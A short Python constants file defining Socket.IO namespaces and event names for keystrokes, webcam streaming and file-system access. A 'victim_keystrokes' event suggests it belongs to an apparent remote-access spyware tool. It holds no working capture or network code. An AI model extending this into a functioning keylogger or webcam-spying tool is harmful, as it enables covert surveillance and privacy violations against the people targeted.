from enum import Enum

class Task(Enum):
    START = "Start"
    STOP = "Stop"

class Namespaces(Enum):
    FILE_DIRECTORY = "/file_directory"
    WEB_CAMERA = "/web_camera"
    KEYSTROKES = "/keystrokes"

class SocketIOEvents(Enum):
    VICTIM_KEYSTROKES = "victim_keystrokes"
    VIDEO_STREAM = "video_stream"
    FILE_SYSTEM = "file_system"
    KEYSTROKES = "keystrokes"
    FILE_DIRECTORY = "file_directory"
    WEB_CAMERA = "web_camera"